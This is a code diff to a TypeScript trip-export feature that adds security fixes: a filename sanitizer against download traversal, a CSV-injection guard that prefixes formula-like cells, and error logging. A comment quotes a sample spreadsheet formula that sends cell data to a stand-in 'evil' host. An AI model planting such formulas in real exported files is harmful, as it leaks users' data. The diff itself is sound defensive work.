@@ -34,6 +34,29 @@ function downloadBlob(content: string, filename: string, type: string): void {
   URL.revokeObjectURL(url);
 }
 
+/**
+ * Sanitize a filename component: strip path separators, control chars, and
+ * Windows-reserved characters. v2.33.36 security audit round 1 — `tripName`
+ * came straight from user input (`a.download = "${tripName}-${date}.csv"`),
+ * which Safari historically interpreted as a path (download traversal).
+ */
+function safeFileBase(raw: string): string {
+  // eslint-disable-next-line no-control-regex
+  const stripped = raw.replace(/[\\/\x00-\x1f<>:"|?*]/g, '_').trim();
+  return stripped.slice(0, 80) || 'trip';
+}
+
+/**
+ * CSV injection guard. v2.33.36 security audit round 1 — cells starting with
+ * `=` / `+` / `-` / `@` / `\t` / `\r` are interpreted as formulas by Excel /
+ * Google Sheets, leaking other cells via `=HYPERLINK("evil",A1)` etc. Prefix
+ * with a single quote — the standard mitigation.
+ */
+function csvSafe(cell: unknown): string {
+  const s = cell == null || cell === '' ? '' : String(cell);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 const DOC_LABEL_MAP: Record<string, string> = {
   flights: '航班資訊', checklist: '出發前確認清單',
   backup: '備案', emergency: '緊急聯絡', suggestions: 'AI 解籤',
@@ -87,7 +110,7 @@ export async function downloadTripFormat(
   const { tripId, trip } = opts;
   const tripName = trip?.name || 'trip';
   const today = new Date().toISOString().slice(0, 10);
-  const fileBase = `${tripName}-${today}`;
+  const fileBase = safeFileBase(`${tripName}-${today}`);
 
   const s = (v: unknown) => (v != null && v !== '') ? String(v) : '';
 
@@ -192,7 +215,8 @@ export async function downloadTripFormat(
       ];
       const rows: string[][] = [headers];
 
-      const csvCell = (v: unknown) => s(v);
+      // v2.33.36: CSV injection guard — see csvSafe() doc above.
+      const csvCell = (v: unknown) => csvSafe(s(v));
 
       for (const day of daysData) {
         const dayNum = s(day.dayNum);
@@ -265,8 +289,12 @@ export async function downloadTripFormat(
       }
       document.body.classList.remove('print-mode');
     }
-  } catch {
+  } catch (err) {
     document.body.classList.remove('print-mode');
+    // v2.33.36 code review round 1: log the underlying error so users can
+    // attach console output to bug reports. Previously the empty `catch {}`
+    // hid the actual failure (network 500, html2pdf import error, etc).
+    console.error('[downloadTripFormat]', err);
     showToast('下載失敗，請稍後再試', 'error', 3000);
   }
 }
